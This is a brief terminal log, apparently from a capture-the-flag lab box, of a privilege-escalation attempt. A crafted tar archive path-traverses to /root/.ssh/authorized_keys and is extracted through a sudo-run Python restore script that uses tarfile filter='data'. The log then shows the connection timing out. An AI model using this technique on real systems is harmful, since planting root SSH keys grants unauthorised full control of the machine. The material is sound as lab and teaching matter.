[+] Added payload file: escape/root/.ssh/authorized_keys

[*] Created backup_1001.tar
[*] Target file on extraction: /root/.ssh/authorized_keys

[!] Transfer this tar to the target and trigger extraction
[!] via the vulnerable Python script using filter='data'
wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
[+] Backup: backup_1001.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn
wacky@wingdata:/opt/backup_clients/backups$ Read from remote host wingdata.htb: Connection timed out
Connection to wingdata.htb closed.
client_loop: send disconnect: Broken pipe  
```